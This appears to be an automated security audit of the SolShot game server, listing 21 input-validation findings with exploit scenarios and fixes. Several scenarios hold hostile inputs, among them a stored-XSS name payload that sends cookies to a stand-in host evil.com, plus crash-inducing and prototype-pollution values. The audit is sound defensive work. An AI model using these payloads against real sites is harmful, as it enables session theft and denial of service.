# 06 - Account & Input Validation Audit

**Auditor**: Claude Opus 4.6 (automated static analysis)
**Date**: 2026-02-14
**Scope**: All server-side source files in `server/`
**Focus**: Wallet address validation, input sanitization, payload type-checking, MongoDB injection, prototype pollution, undefined/null safety

---

## Executive Summary

The SolShot server performs **virtually no input validation** on any socket event payload. Wallet addresses are accepted as raw strings without format verification in all gameplay paths. Player names are stored and broadcast verbatim with no sanitization, length limits, or encoding -- creating stored XSS vectors. Player color values are never validated as integers. The `fire` event accepts angle, power, startX, and startY as untyped values with no numeric bounds checks, allowing NaN/Infinity injection into the physics engine. MongoDB queries use Mongoose (which provides schema-level typing) but user-supplied strings flow directly into document fields without sanitization. The `client.isHost` flag is set server-side but the trust boundary is fragile because it is used for authorization decisions without cross-referencing the room's actual host socketId.

**Total findings**: 21
- CRITICAL: 5
- HIGH: 8
- MEDIUM: 6
- LOW: 2

---

## Finding Index

| # | Severity | Category | Location | Title |
|---|----------|----------|----------|-------|
| V-01 | CRITICAL | Wallet Validation | `main.js:288-344` | `joinRoom` accepts arbitrary wallet address strings |
| V-02 | CRITICAL | Wallet Validation | `main.js:354-410` | `createRoom` accepts arbitrary wallet address strings |
| V-03 | CRITICAL | Input Sanitization | `main.js:288,328,336,364` | Player names are never sanitized (XSS / injection) |
| V-04 | CRITICAL | Type Checking | `main.js:671` | `fire` payload has no numeric bounds or type validation |
| V-05 | CRITICAL | Type Checking | `main.js:645-658` | `createWeaponArray` accepts unbounded count/max from client |
| V-06 | HIGH | Wallet Validation | `auth.js:28-55` | `verifyWalletSignature` uses `atob()` (browser API, not Node.js) |
| V-07 | HIGH | Wallet Validation | `main.js:170-177,296,370` | Wallet address from payload used without verifying authentication |
| V-08 | HIGH | Color Validation | `main.js:329,364` | Player color never validated as valid hex integer |
| V-09 | HIGH | WeaponId Validation | `main.js:515,671` | `buyWeapon` weaponId not type-checked before catalog lookup |
| V-10 | HIGH | RoomId Safety | `main.js:288-290` | `joinRoom` roomId is a raw user-supplied string used for lookups |
| V-11 | HIGH | isHost Manipulation | `main.js:163-164,327,417,462` | `client.isHost` used for auth decisions but not cross-verified |
| V-12 | HIGH | MongoDB Injection | `main.js:387-398` | User-supplied player name flows directly into MongoDB document |
| V-13 | HIGH | Null/Undefined | `main.js:288,354,671` | Destructured payloads with no nullish guards crash on `undefined` |
| V-14 | MEDIUM | Type Checking | `main.js:631` | `weaponPick` relays `arrayIndex` without type check |
| V-15 | MEDIUM | Type Checking | `main.js:924-930` | `angleChange` and `powerChange` relay values without validation |
| V-16 | MEDIUM | Type Checking | `main.js:937-964` | `terrainPath` accepts unchecked path array and position objects |
| V-17 | MEDIUM | Prototype Pollution | `main.js:375-378,332-334` | Object property assignment with user-controlled keys |
| V-18 | MEDIUM | Input Sanitization | `main.js:66-71,336` | Player name stored in room object and persisted to DB unsanitized |
| V-19 | MEDIUM | WeaponId Validation | `main.js:692` | `fire` weaponId checked against `WEAPON_DATA` but not `WEAPON_CATALOG` |
| V-20 | LOW | Auth Message | `auth.js:65-78` | Auth message timestamp has no nonce -- replay within 5-min window |
| V-21 | LOW | Wallet Format | `auth.js:31-33` | `PublicKey.isOnCurve()` check is necessary but not sufficient |

---

## Detailed Findings

### V-01: `joinRoom` accepts arbitrary wallet address strings [CRITICAL]

**Location**: `server/socket-io/main.js:288-344`

**Description**: The `joinRoom` handler destructures `walletAddress` from the client payload and uses it directly for balance checks and wager state storage. No validation is performed to verify that the string is a valid Base58-encoded Solana public key, nor is there any check that the wallet address matches the socket's authenticated wallet.

```javascript
// main.js:288
client.on('joinRoom', async ({roomId, name, color, walletAddress, wager}) => {
    // ...
    const joinerWallet = walletAddress || authenticatedWallets[client.id] || null
    // ...
    ws.wallets[client.id] = joinerWallet  // line 333 - stored directly
```

**Exploit Scenario**: An attacker sends a `joinRoom` event with `walletAddress` set to another player's wallet address (or any arbitrary string). This wallet address is stored in `wagerStates[roomId].wallets` and later used in settlement calculations. If settlements are ever implemented on-chain, a spoofed winner wallet would receive the payout. Even in the current stub implementation, the match record attributes the wrong wallet to a player.

**Recommendation**:
1. Require that `walletAddress` either matches `authenticatedWallets[client.id]` or is null.
2. If accepting a wallet from the payload, validate it as a proper Base58 Solana address using `PublicKey` constructor + `isOnCurve()`.
3. Never allow a client to supply a wallet address that differs from their authenticated identity.

---

### V-02: `createRoom` accepts arbitrary wallet address strings [CRITICAL]

**Location**: `server/socket-io/main.js:354-410`

**Description**: Identical issue to V-01 but on the room creation path. The `player.walletAddress` from the payload is stored in `wagerStates` without validation:

```javascript
// main.js:369-377
const wagerAmount = player.wager || 0
const walletAddress = player.walletAddress || authenticatedWallets[client.id] || null
// ...
wagerStates[roomId] = {
    amount: wagerAmount,
    wallets: { [client.id]: walletAddress }
}
```

**Exploit Scenario**: A malicious client creates a room with `walletAddress` set to a victim's wallet. If the match is lost, the settlement logic attributes the loss to the victim's wallet. If the match is won, the settlement payout targets the victim's wallet instead of the attacker's -- but the attacker could set it to their own second wallet to launder funds.

**Recommendation**: Same as V-01. The wallet address for wager purposes must come exclusively from the authenticated session, not from the event payload.

---

### V-03: Player names are never sanitized [CRITICAL]

**Location**: `server/socket-io/main.js:288,328,336,364`

**Description**: Player names arrive from the client as raw strings and are:
1. Stored on the socket object (`client.name = name` at line 328)
2. Stored in the room object (`room.player = {name: name, ...}` at line 336)
3. Persisted to MongoDB (`username: player.name` at line 390)
4. Broadcast to all clients in the room via `startPick`, `setRooms`, `shopPhase`, etc.

There is **no** length limit, **no** character filtering, **no** HTML entity encoding, and **no** regex validation.

```javascript
// main.js:328
client.name = name  // raw string from client, no validation

// main.js:336
room.player = {name: name, color: color, socketId: client.id, ...}

// main.js:364 (createRoom)
var host = {name: player.name, color: player.color, socketId: client.id, ...}
```

**Exploit Scenario**:
- **Stored XSS**: An attacker sets their name to `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`. This name is broadcast to every client viewing the lobby (`setRooms`) and to the opponent in `startPick`. If the client-side renders names via `innerHTML` or a framework that doesn't auto-escape, the script executes in every viewer's browser.
- **Name spoofing**: An attacker sets their name to an absurdly long string (megabytes) causing memory exhaustion or rendering crashes on other clients.
- **MongoDB injection**: While Mongoose provides some protection, a name containing `$` operators or deeply nested objects could cause unexpected behavior if the schema typing is bypassed.

**Recommendation**:
1. Enforce a maximum length (e.g., 20 characters), strip or reject on violation.
2. Whitelist allowed characters: alphanumeric, spaces, underscores, hyphens.
3. Apply `String(name).replace(/[<>&"']/g, '')` or equivalent HTML entity encoding before storage and broadcast.
4. Verify `typeof name === 'string'` before any use.

---

### V-04: `fire` payload has no numeric bounds or type validation [CRITICAL]

**Location**: `server/socket-io/main.js:671`

**Description**: The `fire` event handler destructures `angle`, `power`, `weaponId`, `startX`, `startY` from the client payload and passes them directly to `processShot()` in `physics.js`. None of these values are type-checked or bounds-checked.

```javascript
// main.js:671
client.on('fire', async ({angle, power, weaponId, startX, startY}) => {
    // No type checks: angle/power/startX/startY could be strings, NaN, Infinity, objects
    // No bounds checks: power should be 0-100, angle should be 0-2PI, etc.
    // ...
    const result = processShot({
        angle, power, weaponId, startX, startY,
        shooterId: client.id, terrain, tanks
    })
```

In `physics.js:59-84`, these values are used directly in `Math.cos()`, `Math.sin()`, and multiplication. If `power` is `Infinity`, the projectile velocity becomes infinite, potentially causing an infinite loop or memory exhaustion in the trajectory calculation (bounded by `MAX_TRAJECTORY_STEPS = 3000`, so not an infinite loop, but still 3000 iterations with `Infinity` coordinates). If `power` is `NaN`, the entire trajectory becomes `NaN`, and all damage calculations return empty objects.

```javascript
// physics.js:60-64
const velocity = power * POWER_FACTOR;  // NaN * 8 = NaN, Infinity * 8 = Infinity
const rotation = angle - Math.PI / 2;   // if angle is a string: "abc" - 1.57 = NaN
let vx = velocity * Math.cos(rotation);
let vy = velocity * Math.sin(rotation);
```

**Exploit Scenario**:
- **Denial of service**: Send `power: 1e308` (near `Number.MAX_VALUE`). The trajectory calculation runs 3000 steps with astronomical coordinates, producing a massive `trajectory` array that is then broadcast to both clients. Repeated calls could exhaust server memory.
- **Physics bypass**: Send `power: 0` to fire a projectile that never moves, or `power: NaN` to produce no damage while consuming a turn.
- **Position spoofing**: Send `startX: 800, startY: 100` to fire from an arbitrary position -- the server uses the client-supplied start position rather than the stored tank position.

**Recommendation**:
1. Validate types: `typeof angle === 'number' && !isNaN(angle) && isFinite(angle)` for all numeric fields.
2. Validate bounds: `power` in `[0, 100]`, `angle` in `[0, 2*PI]`.
3. **Ignore client-supplied `startX`/`startY`** -- use the server-stored tank position from `room.host.pos` or `room.player.pos`. The server knows where the tanks are; the client should not be able to override this.
4. Validate `weaponId` is a non-negative integer.

---

### V-05: `createWeaponArray` accepts unbounded count/max from client [CRITICAL]

**Location**: `server/socket-io/main.js:645-658`

**Description**: The legacy `createWeaponArray` handler accepts `count` and `max` directly from the client and uses them to generate an array in a loop:

```javascript
// main.js:645-658
client.on('createWeaponArray', ({count, max}) => {
    var room = findRoom(client.roomId)
    if (!room) return
    var x, randomArray = []
    for (let index = 0; index < count; index++) {  // client controls loop bound
        x = Math.floor(Math.random() * max)
        randomArray.push(x)
    }
    room.randomArray = randomArray
    // ...broadcast to room
})
```

**Exploit Scenario**: A malicious client sends `{count: 100000000, max: 10}`. The server enters a loop creating a 100-million-element array, consuming ~800MB of memory and blocking the Node.js event loop for several seconds. This is a trivial denial-of-service attack. If `count` is a non-numeric value like a string, the loop condition `index < "abc"` evaluates to `false` on the first iteration -- which is benign but unintended. If `count` is `Infinity`, the loop runs until memory exhaustion.

**Recommendation**:
1. Validate `typeof count === 'number' && Number.isInteger(count) && count > 0 && count <= 20`.
2. Validate `typeof max === 'number' && Number.isInteger(max) && max > 0 && max <= 100`.
3. Consider removing this legacy handler entirely since server-authoritative weapon assignment exists via the shop system.

---

### V-06: `verifyWalletSignature` uses `atob()` (browser-only API) [HIGH]

**Location**: `server/middleware/auth.js:37`

**Description**: The signature decoding uses `atob()`, which is a browser API:

```javascript
// auth.js:37
const signature = Uint8Array.from(atob(signatureBase64), c => c.charCodeAt(0));
```

While `atob` is available in Node.js 16+ as a global, it was only added to the global scope in Node.js 16.0.0 and logs a deprecation warning in some versions. More importantly, `atob()` does not validate its input -- if `signatureBase64` contains invalid Base64 characters, it throws a `DOMException` (in browsers) or an error in Node.js. The outer `try/catch` catches this, but the error message exposed via `reason: 'Verification error: ...'` leaks implementation details.

Additionally, there is no validation that `signatureBase64` is a string before calling `atob()`. If it is `null`, `undefined`, or a number, `atob()` will coerce it to a string, potentially producing a valid (but wrong) Uint8Array.

**Exploit Scenario**: An attacker sends `signature: 12345` (a number). `atob(12345)` succeeds (Base64 decodes the string `"12345"`), producing a garbage signature. The nacl verification fails, but the error path has already done unnecessary computation. More critically, if an attacker sends `signature: {toString: () => "..."}` (an object), the `atob` call follows the object's `toString()` method -- though in practice this is caught by nacl verification.

**Recommendation**:
1. Use `Buffer.from(signatureBase64, 'base64')` instead of `atob()` for Node.js-native Base64 decoding.
2. Validate `typeof signatureBase64 === 'string'` before decoding.
3. Validate the decoded signature length equals 64 bytes (ed25519 signature size).

---

### V-07: Wallet address from payload used without verifying authentication [HIGH]

**Location**: `server/socket-io/main.js:170-177, 296, 370`

**Description**: Both `joinRoom` and `createRoom` accept a `walletAddress` in the payload and fall back to `authenticatedWallets[client.id]` only if the payload value is falsy:

```javascript
// main.js:296
const joinerWallet = walletAddress || authenticatedWallets[client.id] || null

// main.js:370
const walletAddress = player.walletAddress || authenticatedWallets[client.id] || null
```

This means a client can provide **any** wallet address and bypass the authentication system entirely. The `authenticate` event (line 170) performs proper signature verification, but its result is never enforced on subsequent events.

**Exploit Scenario**: A client skips the `authenticate` event entirely and sends `createRoom` with `walletAddress: "<victim's real wallet>"`. The server stores this spoofed wallet in `wagerStates`. If the match outcome triggers a settlement, the wrong wallet is credited or debited.

**Recommendation**: For wagered matches, require that `authenticatedWallets[client.id]` exists and use only that value. Reject any payload-supplied `walletAddress` when `wagerAmount > 0`. Add middleware that checks `client.isAuthenticated` before processing wager-related events.

---

### V-08: Player color never validated [HIGH]

**Location**: `server/socket-io/main.js:329, 364`

**Description**: The `color` field from both `joinRoom` and `createRoom` payloads is stored directly without any validation:

```javascript
// main.js:329
client.color = color  // could be anything: string, object, array, negative number

// main.js:364
var host = {name: player.name, color: player.color, ...}
```

The color is then persisted to MongoDB (line 68, 77) and broadcast to all clients. The Match schema defines `color: Number` but Mongoose will coerce or reject non-numeric values at write time -- however, the in-memory room object and broadcasts have no such guard.

**Exploit Scenario**:
- Send `color: "<script>alert(1)</script>"` -- if the client renders color values in a context where string coercion is displayed (e.g., a tooltip showing the hex code), this could be an XSS vector.
- Send `color: {$gt: ""}` -- while not directly a MongoDB injection since Mongoose schemas enforce types, if the value is broadcast to clients and used in object property access, it could cause unexpected behavior.
- Send `color: -1` or `color: 999999999999` -- could cause rendering issues or integer overflow on clients.

**Recommendation**:
1. Validate `typeof color === 'number' && Number.isInteger(color) && color >= 0x000000 && color <= 0xFFFFFF`.
2. Reject connections with invalid color values.

---

### V-09: `buyWeapon` weaponId not type-checked before catalog lookup [HIGH]

**Location**: `server/socket-io/main.js:515`

**Description**: The `buyWeapon` handler destructures `weaponId` from the payload and passes it directly to `getWeapon()`:

```javascript
// main.js:515
client.on('buyWeapon', ({weaponId}) => {
    // ...
    const weapon = getWeapon(weaponId)  // line 526
    if (!weapon) { ... return }
```

While `getWeapon()` performs a lookup in `WEAPON_CATALOG[weaponId]` which returns `null` for non-existent IDs, the `weaponId` is also used as an `Array.includes()` argument (line 534) and pushed into an array (line 554). If `weaponId` is an object or string rather than a number, `includes()` comparison would fail (no match), and the string/object would be pushed into the inventory array.

```javascript
// main.js:534
if (inventory && inventory[client.id] && inventory[client.id].includes(weaponId)) {
    // String "0" !== Number 0, so "already owned" check fails for type-mismatched IDs
```

**Exploit Scenario**: Send `{weaponId: "0"}` (string instead of number). The string `"0"` looks up `WEAPON_CATALOG["0"]` which resolves to the same object as `WEAPON_CATALOG[0]` due to JavaScript's property access coercion. The purchase succeeds. But `inventory[client.id].includes("0")` does not match `0` (strict equality), so the "already owned" check fails. The player can buy the same weapon multiple times with type-mismatched IDs. While the weapon array grows, the Gold is deducted each time -- so this is more of a logic bug than an exploit, but it pollutes state.

More concerning: send `{weaponId: "__proto__"}` -- `WEAPON_CATALOG["__proto__"]` returns `undefined`, so `getWeapon` returns null and the request is rejected. This specific case is safe.

**Recommendation**:
1. Validate `typeof weaponId === 'number' && Number.isInteger(weaponId) && weaponId >= 0`.
2. Cast: `weaponId = parseInt(weaponId, 10)` and verify `!isNaN(weaponId)`.

---

### V-10: `joinRoom` roomId is a raw user-supplied string [HIGH]

**Location**: `server/socket-io/main.js:288-290`

**Description**: The `roomId` in `joinRoom` comes directly from the client payload and is used to:
1. Look up the room in the in-memory array via `findRoom(roomId)` (line 290)
2. Join a Socket.IO room via `client.join(roomId)` (line 325)
3. Key into multiple state maps: `wagerStates[roomId]`, `matchStates[roomId]`, etc.

```javascript
// main.js:288-290
client.on('joinRoom', async ({roomId, name, color, walletAddress, wager}) => {
    if (client.roomId === roomId) return
    var room = findRoom(roomId)
    if (!room || room.active === true) return
```

The `findRoom` lookup is safe (linear scan with `===`), but the `client.join(roomId)` call with an arbitrary string could be used to join any Socket.IO room on the server. If `roomId` is not a string (e.g., an object), it could cause unexpected behavior in Socket.IO's internal room management.

Room IDs are generated as `Math.random().toString(32).slice(2,8)` (line 360) -- a 6-character alphanumeric string. There is no validation that the client-supplied `roomId` matches this format.

**Exploit Scenario**:
- An attacker sends `joinRoom` with `roomId` set to a very long string (megabytes). While `findRoom` would return `undefined` (no match), the Socket.IO `client.join()` call would create a room with that name in memory.
- An attacker could iterate through the small keyspace (32^6 = ~1 billion possibilities, but practically far fewer since `Math.random().toString(32).slice(2,8)` produces predictable patterns) to join rooms uninvited.
- Sending `roomId: ["__proto__"]` (an array) would cause `findRoom` to compare against `===` (safe) but `client.join()` would receive an array, which Socket.IO handles by joining each element.

**Recommendation**:
1. Validate `typeof roomId === 'string' && /^[a-z0-9]{4,8}$/.test(roomId)` before any processing.
2. Use cryptographically random room IDs (e.g., `crypto.randomBytes(8).toString('hex')`) to prevent guessing.

---

### V-11: `client.isHost` used for authorization but not cross-verified [HIGH]

**Location**: `server/socket-io/main.js:163-164, 327, 417, 462`

**Description**: The `client.isHost` flag is set by the server at connection time (line 163: `client.isHost = false`) and flipped when a room is created (line 363: `client.isHost = true`) or when leaving/disconnecting. It is then used in multiple places for authorization decisions:

```javascript
// main.js:417 (ready handler)
if (client.isHost === true) {
    room.host.isReady = true
    // ...

// main.js:190-191 (disconnect handler)
const opponentId = client.isHost
    ? (room.player ? room.player.socketId : null)
    : (room.host ? room.host.socketId : null)
```

While `client.isHost` is only set server-side (not directly from client input), the issue is that it is not cross-verified against the room's actual host socketId. If any code path sets `client.isHost = true` erroneously (or fails to set it to `false` on leave), the flag is stale.

Specifically, in `deleteRoom` (line 274-284), the handler does not check `client.isHost === true` before allowing deletion. Any player in the room can delete it:

```javascript
// main.js:274
client.on('deleteRoom', async () => {
    if (client.roomId !== null) {
        client.leave(client.roomId)
        await removeRoom(client.roomId)
        // No check: is this client actually the host?
```

**Exploit Scenario**: A non-host player emits `deleteRoom` to destroy the room, kicking the host and potentially causing a wager state to be deleted without settlement. In a wagered match, this could prevent the host from receiving their rightful payout.

**Recommendation**:
1. Replace `client.isHost` checks with `room.host.socketId === client.id` for every authorization decision.
2. Add a host-only guard to `deleteRoom`: `if (!room || room.host.socketId !== client.id) return`.

---

### V-12: User-supplied player name flows directly into MongoDB [HIGH]

**Location**: `server/socket-io/main.js:387-398`

**Description**: When a room is created, the player name is persisted to MongoDB without sanitization:

```javascript
// main.js:387-398
const match = await Match.create({
    roomCode: roomId,
    host: {
        username: player.name,  // raw user input
        socketId: client.id,
        color: player.color,    // raw user input
        isReady: false,
        playAgain: false
    },
    status: 'lobby',
    active: false
});
```

Similarly, when a player joins (via `persistRoom`, lines 56-86):

```javascript
// main.js:66-71
update.host = {
    username: room.host.name,  // raw user input
    socketId: room.host.socketId,
    color: room.host.color,    // raw user input
```

Mongoose enforces schema types (String for username, Number for color), which prevents classic MongoDB operator injection (`{$gt: ""}`). However:
1. The `username: String` schema has no `maxlength`, `minlength`, or `match` validators.
2. A multi-megabyte username would be stored in the database, causing storage bloat.
3. If the data is ever queried and rendered in an admin dashboard or API response without escaping, XSS is possible.

**Exploit Scenario**: An attacker sets their name to a 10MB string and creates 100 rooms. Each `Match.create()` stores the 10MB string, consuming 1GB of MongoDB storage. The `getOpenRooms()` function (line 50-53) returns up to 5 rooms to every client polling the lobby, broadcasting 50MB of name data per request.

**Recommendation**:
1. Add Mongoose schema validation: `username: { type: String, maxlength: 24, match: /^[a-zA-Z0-9_ -]+$/ }`.
2. Validate and truncate at the socket handler level before any storage or broadcast.

---

### V-13: Destructured payloads with no nullish guards [HIGH]

**Location**: `server/socket-io/main.js:288, 354, 671`

**Description**: Socket event handlers use destructuring on the callback argument with no fallback for when the client sends `null`, `undefined`, or a non-object payload:

```javascript
// main.js:288
client.on('joinRoom', async ({roomId, name, color, walletAddress, wager}) => {
// If client sends: socket.emit('joinRoom', null) → TypeError: Cannot destructure property 'roomId' of null

// main.js:354
client.on('createRoom', async ({player}) => {
// If client sends: socket.emit('createRoom', undefined) → TypeError

// main.js:671
client.on('fire', async ({angle, power, weaponId, startX, startY}) => {
// If client sends: socket.emit('fire', "not an object") → TypeError
```

Socket.IO does not validate callback arguments. If a client sends `null`, `undefined`, a string, a number, or any non-object, the destructuring throws a `TypeError`. This uncaught exception in an `async` handler results in an unhandled promise rejection, which:
1. In Node.js 15+, crashes the process by default.
2. Even if caught globally, the socket event handler aborts without cleanup.

**Exploit Scenario**: An attacker sends `socket.emit('fire', null)` repeatedly. Each call throws an uncaught TypeError. In Node.js 15+, this crashes the server on the first call. In earlier versions, it floods the console with warnings and prevents the handler from executing any cleanup logic.

**Recommendation**:
1. Add a guard at the top of every handler: `if (!data || typeof data !== 'object') return;`
2. Use default values in destructuring: `({roomId = null, name = '', color = 0, ...} = {}) =>`
3. Wrap all handlers in a try/catch or use a utility function:
```javascript
function safeHandler(fn) {
    return (data) => {
        try { fn(data || {}); }
        catch (err) { console.error('Handler error:', err.message); }
    };
}
```

---

### V-14: `weaponPick` relays `arrayIndex` without type check [MEDIUM]

**Location**: `server/socket-io/main.js:631`

**Description**: The `weaponPick` event blindly relays the `arrayIndex` value to the opponent:

```javascript
// main.js:631
client.on('weaponPick', ({arrayIndex}) => {
    client.to(client.roomId).emit('opponentWeaponPick', {arrayIndex})
})
```

No validation that `arrayIndex` is a number, is within bounds, or is even defined. The opponent's client receives whatever was sent.

**Exploit Scenario**: An attacker sends `{arrayIndex: "<script>alert(1)</script>"}`. If the opponent's client uses this value in a rendering context without escaping, it enables XSS. More practically, sending `{arrayIndex: -1}` or `{arrayIndex: 99999}` could cause array out-of-bounds errors on the client.

**Recommendation**: Validate `typeof arrayIndex === 'number' && Number.isInteger(arrayIndex) && arrayIndex >= 0 && arrayIndex < MAX_WEAPONS`.

---

### V-15: `angleChange` and `powerChange` relay values without validation [MEDIUM]

**Location**: `server/socket-io/main.js:924-930`

**Description**: These events relay rotation and power values directly to the opponent:

```javascript
// main.js:924-930
client.on('angleChange', ({rotation}) => {
    client.to(client.roomId).emit('opponentAngleChange', {rotation: rotation})
})
client.on('powerChange', ({power}) => {
    client.to(client.roomId).emit('opponentPowerChange', {power: power})
})
```

These are visual-only relay events (the opponent sees the turret moving), but they still transmit unchecked values.

**Exploit Scenario**: Sending `{rotation: NaN}` or `{power: Infinity}` could crash the opponent's Phaser rendering if the client uses these values in `Math.cos()`/`Math.sin()` for turret animation without guards.

**Recommendation**: Validate that `rotation` and `power` are finite numbers within expected ranges.

---

### V-16: `terrainPath` accepts unchecked path array and position objects [MEDIUM]

**Location**: `server/socket-io/main.js:937-964`

**Description**: The legacy `terrainPath` handler accepts an entire terrain path array and two position objects from the client:

```javascript
// main.js:937
client.on('terrainPath', ({path, hostPos, playerPos}) => {
    var room = findRoom(client.roomId)
    if (!room) return
    room.terrainPath = [...path]       // spread of unchecked array
    room.host.pos = {...hostPos}        // spread of unchecked object
    room.player.pos = {...playerPos}    // spread of unchecked object
```

The `...path` spread operator copies all elements of `path` regardless of their types or count. If `path` contains millions of elements, this consumes server memory. If `path` elements contain arbitrary objects instead of `{x, y}` pairs, they are stored and later broadcast.

The `{...hostPos}` and `{...playerPos}` spreads copy all enumerable properties of the supplied objects, including any unexpected ones.

**Exploit Scenario**:
- Send `path: new Array(10000000).fill({x:0,y:0})` to consume hundreds of MB of server memory.
- Send `hostPos: {x: 0, y: 0, __proto__: {isAdmin: true}}` -- while `{...hostPos}` creates a shallow copy that does not copy `__proto__`, if `hostPos` has own properties with dangerous names, they are copied into `room.host.pos`.

**Recommendation**:
1. Validate `Array.isArray(path) && path.length <= 1000`.
2. Validate each path element has numeric `x` and `y` properties only.
3. Validate `hostPos` and `playerPos` as `{x: number, y: number}` with bounds checks.
4. Consider removing this legacy handler in favor of server-generated terrain.

---

### V-17: Object property assignment with user-controlled keys (weak prototype pollution vector) [MEDIUM]

**Location**: `server/socket-io/main.js:375-378, 332-334`

**Description**: The wager state and wallet mappings use `client.id` as property keys:

```javascript
// main.js:375-378
wagerStates[roomId] = {
    amount: wagerAmount,
    wallets: { [client.id]: walletAddress }
}

// main.js:333
ws.wallets[client.id] = joinerWallet
```

Socket.IO's `client.id` is server-generated and safe. However, the pattern of using bracket notation with dynamic keys appears elsewhere with potentially controllable values.

More concerning is the use of `Object.entries(result.damage)` in the fire handler (line 743) where `result.damage` keys come from `tank.id` values, which are socket IDs (server-controlled). This is safe.

The actual prototype pollution risk is low because:
1. All dynamic keys in state objects come from `client.id` (server-generated Socket.IO IDs)
2. Room IDs come from `Math.random().toString(32)` (server-generated)
3. No user-supplied string is used as a direct property key in bracket notation

However, the `{...hostPos}` and `{...playerPos}` spreads in the terrain handler (V-16) could copy a `__proto__` own property if explicitly set:

```javascript
// If hostPos = JSON.parse('{"x":0,"y":0,"__proto__":{"polluted":true}}')
// Then {...hostPos} copies __proto__ as an own property (NOT pollution)
// BUT room.host.pos.__proto__ would be the copied object
```

In modern JavaScript engines, spreading an object with a `__proto__` own property does not pollute `Object.prototype`. The risk is theoretical.

**Exploit Scenario**: Low practical risk in current code. The main concern is that future code changes might introduce user-controlled keys into bracket notation patterns.

**Recommendation**:
1. Use `Map` objects instead of plain objects for dynamic key-value stores (e.g., `wagerStates`, `matchStates`).
2. If using plain objects, validate that keys do not equal `"__proto__"`, `"constructor"`, or `"prototype"`.
3. Freeze prototypes in sensitive state objects: `Object.create(null)` instead of `{}`.

---

### V-18: Player name stored in room object and persisted unsanitized [MEDIUM]

**Location**: `server/socket-io/main.js:66-71, 336`

**Description**: Extends V-03 and V-12. The player name passes through three storage layers without sanitization:

1. **In-memory socket**: `client.name = name`
2. **In-memory room**: `room.player = {name: name, ...}`
3. **MongoDB**: `username: player.name` (via `Match.create` and `persistRoom`)

And is broadcast to clients in at least 4 events:
- `setRooms` (lobby listing to ALL connected clients)
- `startPick` (to both players in room)
- `shopPhase` (indirectly via room reference)
- `matchEnd` (indirectly via room reference)

The `setRooms` broadcast (line 342, 409) sends room data to every connected client, meaning a malicious name in one room is seen by every user viewing the lobby.

**Exploit Scenario**: Same as V-03. The amplification factor is that `setRooms` is broadcast globally -- every `io.emit('setRooms', ...)` sends the malicious name to all connected sockets.

**Recommendation**: Sanitize once at the entry point (before any storage or broadcast). Apply both length limits and character whitelisting.

---

### V-19: `fire` weaponId checked against `WEAPON_DATA` but not `WEAPON_CATALOG` [MEDIUM]

**Location**: `server/socket-io/main.js:692`

**Description**: The `fire` handler validates `weaponId` against the physics engine's `WEAPON_DATA` (line 692), while the `buyWeapon` handler validates against `WEAPON_CATALOG` (line 526). These are two different objects with different weapon IDs:

```javascript
// main.js:692 (fire handler)
if (!WEAPON_DATA[weaponId]) {
    client.emit('fireRejected', { reason: 'Invalid weapon' })
    return
}

// main.js:526 (buyWeapon handler)
const weapon = getWeapon(weaponId)  // uses WEAPON_CATALOG
```

`WEAPON_DATA` (physics.js) and `WEAPON_CATALOG` (Weapon.js) define the same 13 weapons but with slightly different property values (e.g., `WEAPON_DATA[0].damageFactor = 60/46 = 1.304` vs `WEAPON_CATALOG[0].damageFactor = 1.30`). More importantly, neither check verifies that the player actually **owns** the weapon they are trying to fire.

**Exploit Scenario**: A player who only purchased weapon ID 0 (Single Shot, free) can fire weapon ID 9 (Crazy Ivan, 2500 Gold) without purchasing it. The `fire` handler only checks that the weaponId exists in `WEAPON_DATA`, not that it exists in the player's `weaponInventories[roomId][client.id]` array.

**Recommendation**:
1. Add inventory check in the `fire` handler: verify `weaponInventories[roomId]?.[client.id]?.includes(weaponId)`.
2. Reconcile `WEAPON_DATA` and `WEAPON_CATALOG` into a single source of truth.

---

### V-20: Auth message timestamp has no nonce -- replay within 5-minute window [LOW]

**Location**: `server/middleware/auth.js:65-78`

**Description**: The authentication message format is `"SolShot Auth: <wallet> at <timestamp>"` with a 5-minute validity window. There is no nonce or per-session unique value:

```javascript
// auth.js:72-73
const age = Date.now() - timestamp;
if (age > AUTH_TIMEOUT || age < -60000) {
    return { valid: false, reason: 'Auth message expired' };
}
```

If an attacker intercepts a valid authentication payload (e.g., via XSS, network sniffing on non-HTTPS, or a compromised client), they can replay it within the 5-minute window to authenticate as the victim on a different socket.

**Exploit Scenario**: Attacker captures a valid `{walletAddress, message, signature, timestamp}` tuple from a victim (e.g., via a compromised client build). Within 5 minutes, the attacker connects a new socket and replays the authentication data. The server accepts it because the timestamp is still within the window.

**Recommendation**:
1. Include a server-generated nonce in the auth message: client requests a nonce, server stores it, client signs the message including the nonce, server verifies the nonce was used exactly once.
2. Alternatively, include the socket ID in the message: `"SolShot Auth: <wallet> on <socketId> at <timestamp>"` and verify the socket ID matches.

---

### V-21: `PublicKey.isOnCurve()` check is necessary but not sufficient [LOW]

**Location**: `server/middleware/auth.js:31-33`

**Description**: The `verifyWalletSignature` function checks that the wallet address is on the ed25519 curve:

```javascript
// auth.js:31-33
const publicKey = new PublicKey(walletAddress);
if (!PublicKey.isOnCurve(publicKey.toBytes())) {
    return { valid: false, reason: 'Invalid wallet address' };
}
```

The `new PublicKey(walletAddress)` constructor already validates Base58 format and 32-byte length. The `isOnCurve()` check verifies the point is on the ed25519 curve. This is a reasonable check for ensuring the address corresponds to a real keypair (as opposed to a PDA or arbitrary 32-byte value).

However, this check only runs during the `authenticate` event. As noted in V-01 and V-02, wallet addresses supplied in `joinRoom` and `createRoom` payloads bypass this check entirely.

**Exploit Scenario**: Limited. In the `authenticate` path, the checks are adequate. The issue is that authenticated wallet addresses are not enforced in the gameplay paths where wallet addresses are actually used.

**Recommendation**: Enforce the `authenticate` pathway as the sole source of wallet identity. Remove the ability to supply wallet addresses in gameplay event payloads.

---

## Summary Table: Validation Gaps by Socket Event

| Event | Payload Fields | Type Check | Bounds Check | Sanitized | Auth Required |
|-------|---------------|------------|--------------|-----------|---------------|
| `authenticate` | walletAddress, message, signature, timestamp | Partial (atob) | Partial (5min) | No | N/A (is auth) |
| `createRoom` | player.name, player.color, player.walletAddress, player.wager | **None** | **None** | **None** | **No** |
| `joinRoom` | roomId, name, color, walletAddress, wager | **None** | **None** | **None** | **No** |
| `ready` | (none) | N/A | N/A | N/A | No |
| `buyWeapon` | weaponId | **None** | Catalog check | N/A | No |
| `shopDone` | (none) | N/A | N/A | N/A | No |
| `fire` | angle, power, weaponId, startX, startY | **None** | **None** | N/A | No |
